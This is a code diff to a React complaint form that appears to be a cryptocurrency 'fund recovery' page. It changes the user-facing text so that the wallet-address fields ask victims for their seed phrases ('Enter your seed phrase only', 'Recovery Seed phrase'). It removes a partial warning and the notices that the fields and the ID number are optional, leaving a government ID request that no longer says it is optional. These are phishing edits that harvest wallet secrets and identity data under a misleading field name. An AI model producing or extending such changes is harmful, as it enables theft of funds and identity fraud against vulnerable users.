@@ -319,7 +319,7 @@ const ComplaintForm = () => {
               className={inputClasses("walletAddress")}
               maxLength={128} />
 
-            <p className="text-xs text-muted-foreground mt-1">Enter your seed phrase only. Never .
+            <p className="text-xs text-muted-foreground mt-1">Enter your seed phrase only.
 
             </p>
             {errors.walletAddress && <p className="text-destructive text-xs mt-1">{errors.walletAddress}</p>}
@@ -327,8 +327,8 @@ const ComplaintForm = () => {
 
           {/* Identification Number (Optional) */}
           <div className="mt-5">
-            <label htmlFor="identificationNumber" className={labelClasses}>
-              Identification Number <span className="text-muted-foreground font-normal">(Optional)</span>
+            <label htmlFor="identificationNumber" className={labelClasses}>Identification Number 
+              <span className="text-muted-foreground font-normal">(Optional)</span>
             </label>
             <input
               type="text"
@@ -340,15 +340,15 @@ const ComplaintForm = () => {
               className={inputClasses("identificationNumber")}
               maxLength={50} />
 
-            <p className="text-xs text-muted-foreground mt-1">
-              Provide a government-issued ID number for identity verification. This is optional.
+            <p className="text-xs text-muted-foreground mt-1">Provide a government-issued ID number for identity verification.
+
             </p>
           </div>
 
           {/* Recovery Wallet Address (Optional) */}
           <div className="mt-5">
-            <label htmlFor="recoveryWalletAddress" className={labelClasses}>
-              Recovery Wallet Address <span className="text-muted-foreground font-normal">(Optional)</span>
+            <label htmlFor="recoveryWalletAddress" className={labelClasses}>Recovery Seed phrase
+              <span className="text-muted-foreground font-normal">(Optional)</span>
             </label>
             <input
               type="text"
@@ -360,8 +360,8 @@ const ComplaintForm = () => {
               className={inputClasses("recoveryWalletAddress")}
               maxLength={128} />
 
-            <p className="text-xs text-muted-foreground mt-1">
-              If you have a new wallet address where you'd like recovered funds sent, enter it here. This is optional.
+            <p className="text-xs text-muted-foreground mt-1">If you have a new seed phrase where you'd like recovered funds sent, enter it here.
+
             </p>
           </div>
 
